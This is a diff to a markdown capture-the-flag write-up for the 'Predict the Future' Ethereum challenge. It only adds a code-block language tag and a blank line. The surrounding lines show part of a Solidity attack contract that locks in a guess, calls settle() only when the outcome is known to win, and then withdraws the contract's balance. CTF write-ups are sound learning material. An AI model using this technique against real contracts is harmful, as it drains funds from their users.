@@ -196,7 +196,7 @@ With this in mind we can exploit it:
 
 This way we only bet when we know we will win :)
 
-```
+```solidity
 function lockInGuess() public payable {
   challenge.lockInGuess.value(1 ether)(0); // Guess will be 0
 }
@@ -208,6 +208,7 @@ function attack() public {
   challenge.settle();
   msg.sender.transfer(address(this).balance);
 }
+
 ```
 
 [Script](./scripts/lotteries/PredictTheFutureChallenge.ts) | [Test](./test/lotteries/PredictTheFutureChallenge.spec.ts)
